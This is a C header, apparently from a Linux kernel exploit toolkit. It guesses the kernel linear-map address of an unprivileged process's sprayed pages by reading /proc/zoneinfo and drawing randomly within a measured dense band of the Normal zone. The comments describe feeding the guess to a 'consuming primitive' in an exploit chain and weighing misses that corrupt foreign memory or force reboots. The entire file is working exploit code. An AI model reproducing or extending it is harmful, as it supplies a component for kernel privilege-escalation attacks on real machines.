/* lib/addr/zoneguess.h -- guessing where an unprivileged process's pages went.
 *
 * Learning a page's physical frame requires privilege, so a chain that needs a
 * controlled page at a known kernel address without it has to guess. The guess
 * is not uniform: an unprivileged process's locked anonymous pages cluster near
 * the top of the main memory zone, so aiming there rather than at the middle
 * raises the hit rate several-fold.
 *
 * The zone's extent is read at run time from a plain interface; only the first
 * frame is a constant. A random draw within the dense band spreads successive
 * attempts across it, so repeated tries explore rather than repeat.
 *
 * A wrong guess aims the consuming primitive at memory that is not the caller's.
 * This is a probabilistic technique and the cost of a miss is the caller's to
 * weigh; pairing it with a page-table walk after the first landing reduces it
 * to a single required guess.
 */
#ifndef LIB_ZONEGUESS_H
#define LIB_ZONEGUESS_H

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "physmap.h"

/* A named field of Node 0 zone Normal from /proc/zoneinfo (shell-readable).
 * "spanned" is the zone's whole PFN extent (holes included); "present" is the
 * populated frames inside it; "managed" is what the page allocator hands out. */
static inline unsigned long long lib_zone_normal_field(const char *name)
{
	FILE *f = fopen("/proc/zoneinfo", "r");
	if (!f) return 0;
	char l[256], pat[32]; int in_normal = 0; unsigned long long got = 0, v;
	snprintf(pat, sizeof pat, " %s %%llu", name);
	while (fgets(l, sizeof(l), f)) {
		if (strstr(l, "zone")) in_normal = (strstr(l, "Normal") != NULL);
		if (in_normal && sscanf(l, pat, &v) == 1) { got = v; break; }
	}
	fclose(f);
	return got;
}
static inline unsigned long long lib_zone_normal_spanned(void) { return lib_zone_normal_field("spanned"); }
static inline unsigned long long lib_zone_normal_present(void) { return lib_zone_normal_field("present"); }

/* Expected hit rate of a single guess, in permille, computed BEFORE the guess
 * consumes anything: a spray of `spray_bytes` scatters across the populated
 * frames of the zone, so a random draw lands on one of ours with probability
 * ~= sprayed_frames / present_frames. This is the a-priori "is this guess worth
 * firing" number -- the cost of a miss is a corrupted foreign page, so a caller
 * can weigh the shot (or widen the spray) instead of learning the odds only from
 * the reboot count. Clamped to 1000. */
static inline unsigned lib_zone_guess_coverage_permille(unsigned long long spray_bytes)
{
	unsigned long long present = lib_zone_normal_present();
	if (!present) return 0;
	unsigned long long present_bytes = present << PAGE_SHIFT;
	unsigned long long p = spray_bytes / (present_bytes / 1000 ? present_bytes / 1000 : 1);
	return p > 1000 ? 1000 : (unsigned)p;
}

/* One-line a-priori verdict for the guess about to fire: the populated window,
 * the guessed frame, whether it falls inside that window (a draw outside it can
 * never be ours -- it aims the consuming primitive at an unmapped hole or
 * foreign memory), and the expected coverage. `tag` names the caller's marker so
 * a shot log attributes the verdict. Returns coverage permille for a caller that
 * wants to gate on it. */
static inline unsigned lib_zone_guess_report(const char *tag,
		unsigned long long page_va, unsigned long long spray_bytes)
{
	unsigned long long spanned = lib_zone_normal_spanned();
	unsigned long long present = lib_zone_normal_present();
	unsigned long long start = PHYS_OFFSET_PFN;
	unsigned long long pfn = lib_va_to_pfn(page_va);
	unsigned cov = lib_zone_guess_coverage_permille(spray_bytes);
	int in_span = (pfn >= start && pfn < start + spanned);
	printf("%s spray=%lluMB present=%lluMB span_pfn=[%#llx,%#llx] guess_pfn=%#llx "
	       "in_span=%d coverage~%u.%u%% (miss=~%u.%u%%)\n",
	       tag, spray_bytes >> 20, (present << PAGE_SHIFT) >> 20,
	       start, start + spanned, pfn, in_span,
	       cov / 10, cov % 10, (1000 - cov) / 10, (1000 - cov) % 10);
	fflush(stdout);
	return cov;
}

/* The dense band, in permille of the zone span, that a locked anonymous spray
 * occupies. A device constant (re-measure per device): nothing shell-readable
 * reports populated frame ranges. Narrower than the whole span on purpose --
 * most of `spanned` is unpopulated address space a draw there can never hit. */
#ifndef LIB_ZONEGUESS_BAND_LO
#define LIB_ZONEGUESS_BAND_LO 905
#endif
#ifndef LIB_ZONEGUESS_BAND_HI
#define LIB_ZONEGUESS_BAND_HI 930
#endif

/* Linear-map VA to guess for a controlled page. frac_permille selects how far
 * into the zone span to aim; 0 => a random draw in the dense band so
 * successive hunt shots cover it. */
static inline unsigned long long lib_zone_guess_page_va(unsigned frac_permille)
{
	unsigned long long spanned = lib_zone_normal_spanned();
	unsigned long long start_pfn = PHYS_OFFSET_PFN;
	unsigned long long slice = spanned / 1000;
	unsigned long long r[2] = { 0, 0 };
	int u = open("/dev/urandom", O_RDONLY);
	if (u >= 0) { if (read(u, r, sizeof r) != (ssize_t)sizeof r) { r[0] = 0; r[1] = 0; } close(u); }
	if (!frac_permille)
		frac_permille = LIB_ZONEGUESS_BAND_LO
			      + (unsigned)(r[0] % (LIB_ZONEGUESS_BAND_HI - LIB_ZONEGUESS_BAND_LO + 1));
	/* Offset uniformly inside the slice. Without it the guess is quantised to one
	 * exact frame per permille, so the per-shot rate is which of those fixed
	 * frames the spray happens to own on a given boot rather than the band's
	 * density -- a lottery that swings boot to boot; the offset tracks density. */
	unsigned long long target_pfn = start_pfn + spanned * frac_permille / 1000
				      + (slice ? r[1] % slice : 0);
	return lib_pfn_to_va(target_pfn);
}

#endif
